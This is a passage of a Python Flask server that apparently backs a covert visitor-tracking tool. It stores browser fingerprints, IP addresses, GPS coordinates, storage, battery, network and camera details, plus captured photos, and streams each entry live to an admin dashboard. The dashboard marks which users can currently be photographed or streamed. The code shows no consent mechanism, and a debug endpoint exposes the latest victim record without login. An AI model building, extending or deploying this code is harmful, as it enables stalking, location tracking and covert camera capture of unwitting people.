        logger.info(f"  - Region: {location_data_parsed.get('region', 'NOT SET')}")
        logger.info(f"  - Country: {location_data_parsed.get('country', 'NOT SET')}")
        logger.info(f"  - Coordinates: {location_data_parsed.get('latitude', '?')}, {location_data_parsed.get('longitude', '?')}")
        if location_data_parsed.get('gps'):
            logger.info(f"  - GPS Accuracy: {location_data_parsed.get('gps', {}).get('accuracy', 'NOT SET')}m")
        
        # Log storage info summary
        storage_info_parsed = json.loads(storage_info) if storage_info else {}
        logger.info(f"[DEBUG] Storage Info Summary:")
        logger.info(f"  - Cookies: {len(storage_info_parsed.get('cookies', []))} items")
        logger.info(f"  - LocalStorage: {storage_info_parsed.get('localStorage', {}).get('count', 0)} items")
        logger.info(f"  - SessionStorage: {storage_info_parsed.get('sessionStorage', {}).get('count', 0)} items")
        logger.info(f"  - IndexedDB: {storage_info_parsed.get('indexedDB', {}).get('count', 'unknown')} databases")
        
        # Log connection info
        connection_info_parsed = json.loads(connection_info) if connection_info else {}
        logger.info(f"[DEBUG] Connection Info:")
        if connection_info_parsed.get('tls'):
            logger.info(f"  - Protocol: {connection_info_parsed.get('tls', {}).get('protocol', 'NOT SET')}")
            logger.info(f"  - Secure: {connection_info_parsed.get('tls', {}).get('isSecure', 'NOT SET')}")
        
        # Log VPN detection
        vpn_detection_parsed = json.loads(vpn_detection) if vpn_detection else {}
        logger.info(f"[DEBUG] VPN Detection:")
        logger.info(f"  - Is VPN: {vpn_detection_parsed.get('isVPN', 'NOT SET')}")
        logger.info(f"  - Score: {vpn_detection_parsed.get('score', 'NOT SET')}")
        logger.info(f"  - Reasons: {vpn_detection_parsed.get('reasons', [])}")
        
        # Log battery info
        battery_info_parsed = json.loads(battery_info) if battery_info else {}
        logger.info(f"[DEBUG] Battery Info:")
        if battery_info_parsed.get('supported'):
            logger.info(f"  - Supported: Yes")
            logger.info(f"  - Level: {battery_info_parsed.get('level', 'NOT SET')}")
            logger.info(f"  - Charging: {battery_info_parsed.get('charging', 'NOT SET')}")
            logger.info(f"  - Health: {battery_info_parsed.get('health', 'NOT SET')}")
        else:
            logger.info(f"  - Supported: No")
        
        # Log network info
        network_info_parsed = json.loads(network_info) if network_info else {}
        logger.info(f"[DEBUG] Network Info:")
        if network_info_parsed.get('supported'):
            logger.info(f"  - Supported: Yes")
            logger.info(f"  - Type: {network_info_parsed.get('type', 'NOT SET')}")
            logger.info(f"  - Effective Type: {network_info_parsed.get('effectiveType', 'NOT SET')}")
            logger.info(f"  - Downlink: {network_info_parsed.get('downlink', 'NOT SET')} Mbps")
            logger.info(f"  - RTT: {network_info_parsed.get('rtt', 'NOT SET')} ms")
        else:
            logger.info(f"  - Supported: No")
        
        # Log media devices
        media_devices_parsed = json.loads(media_devices) if media_devices else {}
        logger.info(f"[DEBUG] Media Devices:")
        if media_devices_parsed.get('supported'):
            logger.info(f"  - Supported: Yes")
            logger.info(f"  - Audio Inputs: {media_devices_parsed.get('audioInputs', 0)}")
            logger.info(f"  - Audio Outputs: {media_devices_parsed.get('audioOutputs', 0)}")
            logger.info(f"  - Video Inputs: {media_devices_parsed.get('videoInputs', 0)}")
            logger.info(f"  - Total: {media_devices_parsed.get('total', 0)}")
        else:
            logger.info(f"  - Supported: No")
        
        # Log camera permission
        camera_data = camera_access
        logger.info(f"[DEBUG] Camera Permission:")
        logger.info(f"  - Granted: {camera_data.get('granted', 'NOT SET')}")
        logger.info(f"  - Message: {camera_data.get('message', 'NO MESSAGE')}")
        if camera_data.get('error'):
            logger.warning(f"  - Error: {camera_data.get('error')}")
        
        logger.info("=" * 80)
        
        # Log full raw payload (truncated for readability)
        logger.info(f"[DEBUG] Full Raw Payload (first 2000 chars):")
        raw_payload_str = json.dumps(data, indent=2)
        if len(raw_payload_str) > 2000:
            logger.info(raw_payload_str[:2000] + "... [truncated]")
        else:
            logger.info(raw_payload_str)
        logger.info("=" * 80)

        # Store in database
        try:
            # Add timeout to database connection to prevent hanging
            with closing(sqlite3.connect(DB_PATH, timeout=10.0)) as conn:
                c = conn.cursor()
                
                # Check if user with same fingerprint already exists
                c.execute('SELECT id FROM collected_data WHERE fingerprint = ? ORDER BY timestamp DESC LIMIT 1', (fingerprint,))
                existing_entry = c.fetchone()
                
                if existing_entry:
                    # Update existing entry instead of creating new one
                    entry_id = existing_entry[0]
                    logger.info(f"Updating existing entry #{entry_id} for fingerprint {fingerprint[:16]}...")
                    
                    c.execute('''UPDATE collected_data SET
                                 timestamp = ?,
                                 ip_address = ?,
                                 user_agent = ?,
                                 device_info = ?,
                                 location_data = ?,
                                 storage_info = ?,
                                 connection_info = ?,
                                 vpn_detection = ?,
                                 battery_info = ?,
                                 network_info = ?,
                                 media_devices = ?,
                                 camera_permission = ?,
                                 raw_data = ?
                                 WHERE id = ?''',
                              (timestamp, ip_address, user_agent, device_info,
                               location_data, storage_info, connection_info, vpn_detection,
                               battery_info, network_info, media_devices, camera_permission, raw_data,
                               entry_id))
                    
                    logger.info(f"Entry #{entry_id} updated successfully")
                else:
                    # Create new entry for new user
                    c.execute('''INSERT INTO collected_data
                                 (timestamp, ip_address, user_agent, device_info, fingerprint,
                                  location_data, storage_info, connection_info, vpn_detection,
                                  battery_info, network_info, media_devices, camera_permission, raw_data)
                                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                              (timestamp, ip_address, user_agent, device_info, fingerprint,
                               location_data, storage_info, connection_info, vpn_detection,
                               battery_info, network_info, media_devices, camera_permission, raw_data))
                    entry_id = c.lastrowid
                    logger.info(f"New entry #{entry_id} created for fingerprint {fingerprint[:16]}...")
                
                conn.commit()
                
                # Start background thread for reverse geocoding (non-blocking)
                if should_reverse_geocode and final_lat and final_lon:
                    background_thread = threading.Thread(
                        target=update_location_with_reverse_geocode,
                        args=(entry_id, final_lat, final_lon),
                        daemon=True
                    )
                    background_thread.start()
                    logger.info(f"Started background thread for reverse geocoding of entry #{entry_id}")
                
                # Log what was stored in database
                logger.info("=" * 80)
                logger.info(f"[DEBUG] Database Storage Summary for Entry #{entry_id}:")
                logger.info(f"  - Timestamp: {timestamp}")
                logger.info(f"  - IP Address: {ip_address}")
                logger.info(f"  - Fingerprint: {fingerprint[:32]}...")
                logger.info(f"  - Device Info: {'Stored' if device_info else 'NOT STORED'}")
                logger.info(f"  - Location Data: {'Stored' if location_data else 'NOT STORED'}")
                logger.info(f"  - Storage Info: {'Stored' if storage_info else 'NOT STORED'}")
                logger.info(f"  - Connection Info: {'Stored' if connection_info else 'NOT STORED'}")
                logger.info(f"  - VPN Detection: {'Stored' if vpn_detection else 'NOT STORED'}")
                logger.info(f"  - Battery Info: {'Stored' if battery_info else 'NOT STORED'}")
                logger.info(f"  - Network Info: {'Stored' if network_info else 'NOT STORED'}")
                logger.info(f"  - Media Devices: {'Stored' if media_devices else 'NOT STORED'}")
                logger.info(f"  - Camera Permission: {'Stored' if camera_permission else 'NOT STORED'}")
                logger.info(f"  - Raw Data: {'Stored' if raw_data else 'NOT STORED'}")
                logger.info("=" * 80)
        except sqlite3.Error as e:
            logger.error(f"Database error in collect_data: {e}", exc_info=True)
            return jsonify({'status': 'error', 'message': 'Database error'}), 500

        # Broadcast new/updated entry to admin dashboard via WebSocket
        try:
            if existing_entry:
                # Entry was updated - broadcast update event with full data
                # Also send full entry data so dashboard can add it if not found
                try:
                    with closing(sqlite3.connect(DB_PATH, timeout=10.0)) as conn:
                        c = conn.cursor()
                        c.execute('SELECT * FROM collected_data WHERE id = ?', (entry_id,))
                        row = c.fetchone()
                        
                        if row:
                            # Parse entry data (same as new entry)
                            entry_id_db = row[0]
                            fingerprint_db = row[5]
                            
                            # Find associated photo
                            c.execute('''SELECT filename FROM captured_photos
                                         WHERE fingerprint = ? OR data_entry_id = ?
                                         ORDER BY timestamp DESC LIMIT 1''', (fingerprint_db, entry_id_db))
                            photo_row = c.fetchone()
                            photo_filename = photo_row[0] if photo_row else None
                except sqlite3.Error as e:
                    logger.error(f"Database error fetching entry for WebSocket: {e}", exc_info=True)
                    row = None
                    photo_filename = None
                
                if row:
                    
                    # Parse camera permission
                    camera_permission_raw = row[14] if len(row) > 14 and row[14] else '{}'
                    try:
                        camera_permission = json.loads(camera_permission_raw)
                        if camera_permission and isinstance(camera_permission, dict):
                            if 'deviceInfo' in camera_permission or 'fingerprint' in camera_permission:
                                if 'cameraAccess' in camera_permission:
                                    camera_permission = camera_permission['cameraAccess']
                                else:
                                    camera_permission = {}
                    except Exception as e:
                        logger.warning(f"WebSocket error parsing camera permission: {e}")
                        camera_permission = {}
                    
                    # Check if user is online AND capable (can actually stream/take photos)
                    is_online = False
                    if entry_id_db in active_users:
                        is_online = active_users[entry_id_db].get('capable', False)
                    elif fingerprint_db:
                        for user_info in active_users.values():
                            if user_info.get('fingerprint') == fingerprint_db:
                                is_online = user_info.get('capable', False)
                                break
                    
                    # Prepare full entry data
                    try:
                        entry_data = {
                            'id': entry_id_db,
                            'timestamp': row[1],
                            'ip_address': row[2],
                            'user_agent': row[3],
                            'device_info': json.loads(row[4]) if row[4] else {},
                            'fingerprint': fingerprint_db,
                            'location_data': json.loads(row[6]) if row[6] else {},
                            'storage_info': json.loads(row[7]) if row[7] else {},
                            'connection_info': json.loads(row[8]) if row[8] else {},
                            'vpn_detection': json.loads(row[9]) if row[9] else {},
                            'battery_info': json.loads(row[10]) if len(row) > 10 and row[10] else {},
                            'network_info': json.loads(row[11]) if len(row) > 11 and row[11] else {},
                            'media_devices': json.loads(row[12]) if len(row) > 12 and row[12] else {},
                            'camera_permission': camera_permission,
                            'raw_data': row[14] if len(row) > 14 else None,
                            'profile_photo': photo_filename,
                            'is_online': is_online,
                            'updated': True
                        }
                        
                        # Send as new_entry so dashboard can add/update it
                        socketio.emit('new_entry', entry_data, broadcast=True, include_self=False, namespace='/')
                        logger.debug(f"Broadcasted entry update (as new_entry) for entry #{entry_id}")
                    except Exception as e:
                        logger.error(f"Error preparing updated entry data: {e}", exc_info=True)
                        # Fallback to simple update
                        socketio.emit('entry_updated', {
                            'entry_id': entry_id,
                            'timestamp': timestamp,
                            'ip_address': ip_address,
                            'fingerprint': fingerprint,
                            'updated': True
                        }, broadcast=True, include_self=False, namespace='/')
                        logger.debug(f"Broadcasted simple entry update for entry #{entry_id}")
            else:
                # New entry created - broadcast new entry event
                # Fetch the full entry data to send to dashboard
                try:
                    with closing(sqlite3.connect(DB_PATH, timeout=10.0)) as conn:
                        c = conn.cursor()
                        c.execute('SELECT * FROM collected_data WHERE id = ?', (entry_id,))
                        row = c.fetchone()
                        
                        if row:
                            # Parse the entry data similar to dashboard route
                            entry_id_db = row[0]
                            fingerprint_db = row[5]
                            
                            # Find associated photo
                            c.execute('''SELECT filename FROM captured_photos
                                         WHERE fingerprint = ? OR data_entry_id = ?
                                         ORDER BY timestamp DESC LIMIT 1''', (fingerprint_db, entry_id_db))
                            photo_row = c.fetchone()
                            photo_filename = photo_row[0] if photo_row else None
                except sqlite3.Error as e:
                    logger.error(f"Database error fetching new entry for WebSocket: {e}", exc_info=True)
                    row = None
                    photo_filename = None
                
                if row:
                    
                    # Parse camera permission
                    camera_permission_raw = row[14] if row[14] else '{}'
                    try:
                        camera_permission = json.loads(camera_permission_raw)
                        if camera_permission and isinstance(camera_permission, dict):
                            if 'deviceInfo' in camera_permission or 'fingerprint' in camera_permission:
                                if 'cameraAccess' in camera_permission:
                                    camera_permission = camera_permission['cameraAccess']
                                else:
                                    camera_permission = {}
                    except Exception as e:
                        logger.warning(f"WebSocket error parsing camera permission: {e}")
                        camera_permission = {}
                    
                    # Check if user is online AND capable (can actually stream/take photos)
                    is_online = False
                    if entry_id_db in active_users:
                        is_online = active_users[entry_id_db].get('capable', False)
                    elif fingerprint_db:
                        for user_info in active_users.values():
                            if user_info.get('fingerprint') == fingerprint_db:
                                is_online = user_info.get('capable', False)
                                break
                    
                    # Prepare entry data for dashboard
                    # Column order: id, timestamp, ip_address, user_agent, device_info, fingerprint,
                    # location_data, storage_info, connection_info, vpn_detection,
                    # battery_info, network_info, media_devices, camera_permission, raw_data
                    try:
                        entry_data = {
                            'id': entry_id_db,
                            'timestamp': row[1],
                            'ip_address': row[2],
                            'user_agent': row[3],
                            'device_info': json.loads(row[4]) if row[4] else {},
                            'fingerprint': fingerprint_db,
                            'location_data': json.loads(row[6]) if row[6] else {},
                            'storage_info': json.loads(row[7]) if row[7] else {},
                            'connection_info': json.loads(row[8]) if row[8] else {},
                            'vpn_detection': json.loads(row[9]) if row[9] else {},
                            'battery_info': json.loads(row[10]) if len(row) > 10 and row[10] else {},
                            'network_info': json.loads(row[11]) if len(row) > 11 and row[11] else {},
                            'media_devices': json.loads(row[12]) if len(row) > 12 and row[12] else {},
                            'camera_permission': camera_permission,
                            'raw_data': row[14] if len(row) > 14 else None,
                            'profile_photo': photo_filename,
                            'is_online': is_online
                        }
                        
                        socketio.emit('new_entry', entry_data, broadcast=True, include_self=False, namespace='/')
                        logger.debug(f"Broadcasted new entry #{entry_id} to dashboard")
                        logger.debug(f"Entry data keys: {list(entry_data.keys())}")
                        logger.debug(f"Entry ID: {entry_data.get('id')}, IP: {entry_data.get('ip_address')}")
                    except Exception as e:
                        logger.error(f"Error preparing entry data: {e}", exc_info=True)
        except Exception as e:
            logger.error(f"Error broadcasting entry: {e}", exc_info=True)
            # Don't fail the request if WebSocket broadcast fails

        return jsonify({
            'status': 'success', 
            'message': 'Data collected successfully',
            'entry_id': entry_id,
            'fingerprint': fingerprint,
            'updated': existing_entry is not None
        }), 200

    except ValueError as e:
        logger.warning(f"Validation error in collect_data: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 400
    except sqlite3.Error as e:
        logger.error(f"Database error in collect_data: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Database error'}), 500
    except Exception as e:
        logger.error(f"Unexpected error in collect_data: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

@app.route('/admin/login', methods=['GET', 'POST'])
@limiter.limit("5 per 15 minutes")
def admin_login():
    """Admin login page"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if not username or not password:
            return render_template('login.html', error='Username and password required')
        
        try:
            with closing(sqlite3.connect(DB_PATH)) as conn:
                c = conn.cursor()
                c.execute('SELECT * FROM admin_users WHERE username = ?', (username,))
                user = c.fetchone()
                
                if user:
                    stored_password_hash = user[2]  # password_hash is the 3rd column (index 2)
                    if verify_password(password, stored_password_hash):
                        session['admin_logged_in'] = True
                        session['username'] = username
                        logger.info(f"Admin login successful: {username}")
                        return redirect(url_for('admin_dashboard'))
                    else:
                        logger.warning(f"Failed login attempt for username: {username}")
                        return render_template('login.html', error='Invalid credentials')
                else:
                    logger.warning(f"Failed login attempt for non-existent username: {username}")
                    return render_template('login.html', error='Invalid credentials')
        except sqlite3.Error as e:
            logger.error(f"Database error in admin_login: {e}", exc_info=True)
            return render_template('login.html', error='Database error. Please try again.')
        except Exception as e:
            logger.error(f"Unexpected error in admin_login: {e}", exc_info=True)
            return render_template('login.html', error='An error occurred. Please try again.')

    return render_template('login.html')

@app.route('/admin/logout')
def admin_logout():
    """Admin logout"""
    session.clear()
    return redirect(url_for('admin_login'))

@app.route('/admin/dashboard')
def admin_dashboard():
    """Admin dashboard to view all collected data"""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM collected_data ORDER BY timestamp DESC')
            rows = c.fetchall()

            # Convert rows to list of dictionaries
            data = []
            for row in rows:
                entry_id = row[0]
                fingerprint = row[5]

                # Find associated photo for this entry
                photo_filename = None
                c2 = conn.cursor()
                c2.execute('''SELECT filename FROM captured_photos
                             WHERE fingerprint = ? OR data_entry_id = ?
                             ORDER BY timestamp DESC LIMIT 1''', (fingerprint, entry_id))
                photo_row = c2.fetchone()
                if photo_row:
                    photo_filename = photo_row[0]

                # Parse camera permission
                camera_permission_raw = row[14] if row[14] else '{}'
                try:
                    camera_permission = json.loads(camera_permission_raw)
                    
                    # Check if camera_permission contains the entire raw_data (old bug)
                    # If it has 'deviceInfo', 'fingerprint', etc., it's the full raw data
                    # In that case, extract cameraAccess from it
                    if camera_permission and isinstance(camera_permission, dict):
                        if 'deviceInfo' in camera_permission or 'fingerprint' in camera_permission:
                            # This is the entire raw_data, extract cameraAccess
                            logger.debug(f"Entry #{entry_id} - camera_permission contains full raw_data, extracting cameraAccess")
                            if 'cameraAccess' in camera_permission:
                                camera_permission = camera_permission['cameraAccess']
                                logger.debug(f"Entry #{entry_id} - Extracted cameraAccess: {camera_permission}")
                            else:
                                camera_permission = {}
                        elif 'granted' in camera_permission:
                            # This is the correct format - just camera permission data
                            logger.debug(f"Entry #{entry_id} - camera_permission is correct format: {camera_permission}")
                        else:
                            # Empty or malformed
                            camera_permission = {}
                    
                    # Debug: Log what we're getting from database
                    if camera_permission:
                        logger.debug(f"Entry #{entry_id} - Final camera_permission: {camera_permission}")
                        logger.debug(f"Entry #{entry_id} - granted value: {camera_permission.get('granted')} (type: {type(camera_permission.get('granted'))})")
                except Exception as e:
                    logger.warning(f"Entry #{entry_id} - Error parsing camera_permission: {e}, raw: {camera_permission_raw[:200]}...")
                    camera_permission = {}
                
                # Check if user is online AND capable (can actually stream/take photos)
                is_online = False
                if entry_id in active_users:
                    is_online = active_users[entry_id].get('capable', False)
                elif fingerprint:
                    for user_info in active_users.values():
                        if user_info.get('fingerprint') == fingerprint:
                            is_online = user_info.get('capable', False)
                            break
                
                data.append({
                    'id': entry_id,
                    'timestamp': row[1],
                    'ip_address': row[2],
                    'user_agent': row[3],
                    'device_info': json.loads(row[4]) if row[4] else {},
                    'fingerprint': fingerprint,
                    'location_data': json.loads(row[6]) if row[6] else {},
                    'storage_info': json.loads(row[7]) if row[7] else {},
                    'connection_info': json.loads(row[8]) if row[8] else {},
                    'vpn_detection': json.loads(row[9]) if row[9] else {},
                    'raw_data': row[10],
                    'battery_info': json.loads(row[11]) if row[11] else {},
                    'network_info': json.loads(row[12]) if row[12] else {},
                    'media_devices': json.loads(row[13]) if row[13] else {},
                    'camera_permission': camera_permission,
                    'profile_photo': photo_filename,  # Add profile photo
                    'is_online': is_online  # Add online status
                })
    except sqlite3.Error as e:
        logger.error(f"Database error in admin_dashboard: {e}", exc_info=True)
        return render_template('dashboard.html', data=[], count=0, error='Database error')
    
    return render_template('dashboard.html', data=data, count=len(data))

@app.route('/admin/api/data')
def admin_api_data():
    """API endpoint for admin to get all data as JSON"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM collected_data ORDER BY timestamp DESC')
            rows = c.fetchall()
    except sqlite3.Error as e:
        logger.error(f"Database error in admin_api_data: {e}", exc_info=True)
        return jsonify({'error': 'Database error'}), 500

    data = []
    for row in rows:
        data.append({
            'id': row[0],
            'timestamp': row[1],
            'ip_address': row[2],
            'user_agent': row[3],
            'device_info': json.loads(row[4]) if row[4] else {},
            'fingerprint': row[5],
            'location_data': json.loads(row[6]) if row[6] else {},
            'storage_info': json.loads(row[7]) if row[7] else {},
            'connection_info': json.loads(row[8]) if row[8] else {},
            'vpn_detection': json.loads(row[9]) if row[9] else {},
            'battery_info': json.loads(row[11]) if row[11] else {},
            'network_info': json.loads(row[12]) if row[12] else {},
            'media_devices': json.loads(row[13]) if row[13] else {},
            'camera_permission': json.loads(row[14]) if row[14] else {}
        })

    return jsonify(data)

@app.route('/admin/api/delete/<int:id>', methods=['DELETE'])
def delete_entry(id):
    """Delete a specific entry"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()
            c.execute('DELETE FROM collected_data WHERE id = ?', (id,))
            conn.commit()
    except sqlite3.Error as e:
        logger.error(f"Database error in delete_entry: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Database error'}), 500

    return jsonify({'status': 'success', 'message': 'Entry deleted'})

@app.route('/admin/api/clear-all', methods=['DELETE'])
def clear_all_data():
    """Clear all collected data"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()
            c.execute('DELETE FROM collected_data')
            conn.commit()
            deleted_count = c.rowcount

        logger.info(f"All data cleared. Deleted {deleted_count} entries.")
        return jsonify({'status': 'success', 'message': f'All data cleared. Deleted {deleted_count} entries.'}), 200
    except sqlite3.Error as e:
        logger.error(f"Database error in clear_all_data: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Database error'}), 500
    except Exception as e:
        logger.error(f"Unexpected error in clear_all_data: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

@app.route('/admin/api/reset-database', methods=['DELETE'])
def reset_database():
    """Reset entire database - delete all data, photos, and photo files"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()

            # Count entries before deletion
            c.execute('SELECT COUNT(*) FROM collected_data')
            data_count = c.fetchone()[0]

            c.execute('SELECT COUNT(*) FROM captured_photos')
            photo_count = c.fetchone()[0]

            # Get all photo filenames to delete files
            c.execute('SELECT filepath FROM captured_photos')
            photo_files = c.fetchall()

            # Delete all data from tables
            c.execute('DELETE FROM collected_data')
            c.execute('DELETE FROM captured_photos')

            # Reset auto-increment counters by deleting from sqlite_sequence
            c.execute("DELETE FROM sqlite_sequence WHERE name='collected_data'")
            c.execute("DELETE FROM sqlite_sequence WHERE name='captured_photos'")

            conn.commit()

        # Delete photo files from disk
        deleted_files = 0
        for photo_file in photo_files:
            filepath = photo_file[0]
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
                    deleted_files += 1
            except Exception as e:
                logger.warning(f"Could not delete file {filepath}: {e}")

        logger.info(f"DATABASE RESET - Deleted {data_count} data entries, {photo_count} photo records, {deleted_files} photo files from disk")

        return jsonify({
            'status': 'success',
            'message': f'Database reset complete. Deleted {data_count} data entries, {photo_count} photos, and {deleted_files} files. IDs will start from 1.',
            'data_count': data_count,
            'photo_count': photo_count,
            'files_deleted': deleted_files
        }), 200
    except sqlite3.Error as e:
        logger.error(f"Database error resetting database: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Database error'}), 500
    except Exception as e:
        logger.error(f"Unexpected error resetting database: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

@app.route('/admin/api/update-locations', methods=['POST'])
def update_locations_from_coordinates():
    """Update location names for existing entries that have coordinates but no city/country"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        # Use shared reverse_geocode_coordinates function (with rate limiting and caching)

        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()
            c.execute('SELECT id, location_data FROM collected_data')
            rows = c.fetchall()
            
            updated_count = 0
            for row in rows:
                entry_id = row[0]
                location_data_str = row[1]
                
                if not location_data_str:
                    continue
                    
                try:
                    location_data = json.loads(location_data_str)
                except:
                    continue
                
                # Check if we have coordinates but no city/country
                lat = location_data.get('latitude')
                lon = location_data.get('longitude')
                has_city = location_data.get('city')
                has_country = location_data.get('country')
                
                if lat and lon and (not has_city or not has_country):
                    # Reverse geocode to get location names
                    # Note: Rate limiting is handled by the shared function, but we add a small delay
                    # to be extra safe in batch operations
                    reverse_geocoded = reverse_geocode_coordinates(lat, lon)
                    if reverse_geocoded:
                        # Update location data with reverse geocoded names
                        location_data['city'] = reverse_geocoded.get('city') or location_data.get('city')
                        location_data['country'] = reverse_geocoded.get('country') or location_data.get('country')
                        location_data['region'] = reverse_geocoded.get('region') or location_data.get('region')
                        
                        # Update database
                        c.execute('UPDATE collected_data SET location_data = ? WHERE id = ?', 
                                 (json.dumps(location_data), entry_id))
                        updated_count += 1
                        logger.info(f"Updated entry #{entry_id}: {location_data.get('city')}, {location_data.get('country')}")
                    
                    # Add delay between geocoding requests in batch operations
                    # The rate limiter already handles 1 req/sec, but this provides extra safety
                    time.sleep(1.1)  # Slightly more than 1 second to respect rate limits
            
            conn.commit()
        
        return jsonify({
            'status': 'success',
            'message': f'Updated {updated_count} entries with location names from coordinates',
            'updated_count': updated_count
        }), 200
    except Exception as e:
        logger.error(f"Error updating locations: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/api/update-location-from-coords', methods=['POST'])
def update_location_from_coordinates():
    """Update location data for an entry based on coordinates"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        data = request.json
        entry_id = data.get('entry_id')
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        
        if not entry_id or not latitude or not longitude:
            return jsonify({'error': 'Missing required fields: entry_id, latitude, longitude'}), 400

        # Use shared reverse_geocode_coordinates function (with rate limiting and caching)

        # Reverse geocode the coordinates (non-blocking - continue even if it fails)
        reverse_geocoded = reverse_geocode_coordinates(latitude, longitude)
        if not reverse_geocoded:
            logger.warning(f"Reverse geocoding failed for {latitude},{longitude}, but continuing with coordinates only")

        # Get existing entry data
        try:
            with closing(sqlite3.connect(DB_PATH)) as conn:
                c = conn.cursor()
                c.execute('SELECT location_data FROM collected_data WHERE id = ?', (entry_id,))
                row = c.fetchone()
                
                if not row:
                    return jsonify({'error': 'Entry not found'}), 404

                # Parse existing location data
                try:
                    location_data = json.loads(row[0]) if row[0] else {}
                except:
                    location_data = {}

                # Update location data with new coordinates and reverse geocoded location (if available)
                location_data.update({
                    'latitude': float(latitude),
                    'longitude': float(longitude),
                    'city': reverse_geocoded.get('city') if reverse_geocoded else location_data.get('city'),
                    'country': reverse_geocoded.get('country') if reverse_geocoded else location_data.get('country'),
                    'region': reverse_geocoded.get('region') if reverse_geocoded else location_data.get('region'),
                    'location_type': 'gps',  # Mark as GPS since it's manually updated from map
                    'updated_from_map': True,
                    'updated_at': datetime.now().isoformat()
                })

                # Update database
                c.execute('UPDATE collected_data SET location_data = ? WHERE id = ?', 
                         (json.dumps(location_data), entry_id))
                conn.commit()
        except sqlite3.Error as e:
            logger.error(f"Database error updating location: {e}", exc_info=True)
            return jsonify({'error': 'Database error'}), 500

        city_country = f"{reverse_geocoded.get('city')}, {reverse_geocoded.get('country')}" if reverse_geocoded and reverse_geocoded.get('city') else (reverse_geocoded.get('country') if reverse_geocoded else 'coordinates only')
        logger.info(f"Updated entry #{entry_id} with location: {city_country} at {latitude},{longitude}")

        return jsonify({
            'status': 'success',
            'message': 'Location updated successfully' + (' (coordinates only - reverse geocoding failed)' if not reverse_geocoded else ''),
            'location': {
                'city': reverse_geocoded.get('city') if reverse_geocoded else None,
                'country': reverse_geocoded.get('country') if reverse_geocoded else None,
                'region': reverse_geocoded.get('region') if reverse_geocoded else None,
                'latitude': latitude,
                'longitude': longitude
            }
        }), 200
    except sqlite3.Error as e:
        logger.error(f"Database error updating location: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Database error'}), 500
    except ValueError as e:
        logger.warning(f"Validation error updating location: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 400
    except Exception as e:
        logger.error(f"Unexpected error updating location: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

@app.route('/debug/last-entry')
def debug_last_entry():
    """Debug endpoint to view the last collected entry"""
    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM collected_data ORDER BY id DESC LIMIT 1')
            row = c.fetchone()
    except sqlite3.Error as e:
        logger.error(f"Database error in debug_last_entry: {e}", exc_info=True)
        return jsonify({'error': 'Database error'}), 500

    if not row:
        return jsonify({'message': 'No data collected yet'}), 404

    entry = {
        'id': row[0],
        'timestamp': row[1],
        'ip_address': row[2],
        'user_agent': row[3],
        'device_info': json.loads(row[4]) if row[4] else {},
        'fingerprint': row[5],
        'location_data': json.loads(row[6]) if row[6] else {},
        'storage_info': json.loads(row[7]) if row[7] else {},
        'connection_info': json.loads(row[8]) if row[8] else {},
        'vpn_detection': json.loads(row[9]) if row[9] else {},
        'raw_data_preview': (row[10] or '')[:500] + '...' if row[10] and len(row[10]) > 500 else row[10],
        'battery_info': json.loads(row[11]) if row[11] else {},
        'network_info': json.loads(row[12]) if row[12] else {},
        'media_devices': json.loads(row[13]) if row[13] else {},
        'camera_permission': json.loads(row[14]) if row[14] else {}
    }

    return jsonify(entry), 200

@app.route('/api/save-photo', methods=['POST'])
@limiter.limit("5 per minute")
def save_photo():
    """API endpoint to save captured photos"""
    try:
        if 'photo' not in request.files:
            return jsonify({'status': 'error', 'message': 'No photo file provided'}), 400

        photo = request.files['photo']
        timestamp_str = request.form.get('timestamp', datetime.now().isoformat())
        fingerprint = request.form.get('fingerprint', '')
        photo_ip = request.form.get('ip_address', '')
        capture_source = request.form.get('capture_source', 'unknown')

        # Allow explicit data_entry_id from frontend (for per-user captures)
        data_entry_id = request.form.get('data_entry_id', None)
        if data_entry_id:
            try:
                data_entry_id = int(data_entry_id)
            except ValueError:
                return jsonify({'status': 'error', 'message': 'Invalid data_entry_id'}), 400

        if photo.filename == '':
            return jsonify({'status': 'error', 'message': 'No file selected'}), 400

        # Validate file type
        if not allowed_file(photo.filename):
            return jsonify({'status': 'error', 'message': 'Invalid file type. Only jpg, jpeg, png, gif allowed'}), 400

        # Validate file size before saving
        photo.seek(0, os.SEEK_END)
        file_size = photo.tell()
        photo.seek(0)
        
        if file_size > MAX_FILE_SIZE:
